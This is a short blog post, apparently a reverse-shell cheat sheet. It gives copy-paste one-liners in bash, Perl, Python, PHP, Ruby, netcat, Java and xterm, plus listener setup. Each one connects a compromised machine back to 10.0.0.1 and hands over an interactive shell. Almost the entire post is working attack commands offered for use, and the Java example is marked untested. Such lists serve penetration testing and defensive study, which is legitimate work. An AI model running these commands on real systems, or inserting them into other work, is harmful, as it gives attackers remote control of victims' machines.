---
layout: post
title: "reverse shell"
description: ""
category: 
tags: []
---

### Listen for 8080 first

<pre>
nc -l -p 8080 -vvv
</pre>

### Bash

Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):

<pre>
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
</pre>

### PERL

Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

<pre>
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
</pre>

There’s also an&nbsp;[alternative PERL revere shell here](http://www.plenz.com/reverseshell).

### Python

This was tested under Linux / Python 2.7:

<pre>
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</pre>

### PHP

This code assumes that the TCP connection uses file descriptor 3. &nbsp;This worked on my test system. &nbsp;If it doesn’t work, try 4, 5, 6…

<pre>
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
</pre>

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

### Ruby

<pre>
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
</pre>

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

<pre>
nc -e /bin/sh 10.0.0.1 1234
</pre>

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

<pre>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
</pre>

### Java

<pre>
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
</pre>

[Untested submission from anonymous reader]

### xterm

One of the simplest forms of reverse shell is an xterm session. &nbsp;The following command should be run on the server. &nbsp;It will try to connect back to you (10.0.0.1) on TCP port 6001.

<pre>
xterm -display 10.0.0.1:1
</pre>

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). &nbsp;One way to do this is with Xnest (to be run on your system):

<pre>
Xnest :1
</pre>

You’ll need to authorise the target to connect to you (command also run on your host):

<pre>
xhost +targetip
</pre>

